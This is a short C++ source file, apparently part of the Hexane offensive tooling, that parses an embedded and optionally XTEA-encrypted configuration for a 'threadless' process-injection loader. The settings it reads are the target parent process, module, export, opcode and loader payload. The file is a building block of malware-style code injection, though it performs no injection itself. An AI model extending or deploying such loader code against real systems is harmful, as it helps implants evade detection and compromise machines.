#include <inject/config.hpp>

namespace Loader {

    TXT_SECTION(inject, F) BYTE Config[256] = { };
    void ReadConfig(THREADLESS *Threadless) {

        HEXANE
        PARSER Parser = { };

        Parser::CreateParser(&Parser, Config, sizeof(Config));
        x_memset(Config, 0, sizeof(Config));

        //XteaCrypt(B_PTR(Parser.Handle), Parser.Length, Ctx->ConfigBytes.Key, FALSE);

        Parser::ParserStrcpy(&Parser, LP_SPTR(&Ctx->Config.Key), nullptr);
        Parser::ParserMemcpy(&Parser, LP_BPTR(&Ctx->Root), nullptr);
        Parser::ParserMemcpy(&Parser, LP_BPTR(&Ctx->LE), nullptr);

        Parser::ParserStrcpy(&Parser, &Threadless->Parent.Buffer, &Threadless->Parent.Length);
        Parser::ParserStrcpy(&Parser, &Threadless->Module.Buffer, &Threadless->Module.Length);
        Parser::ParserStrcpy(&Parser, &Threadless->Export.Buffer, &Threadless->Export.Length);
        Parser::ParserStrcpy(&Parser, &Threadless->Opcode.Buffer, &Threadless->Opcode.Length);
        Parser::ParserStrcpy(&Parser, &Threadless->Loader.Buffer, &Threadless->Loader.Length);

        Parser::DestroyParser(&Parser);
    }
}

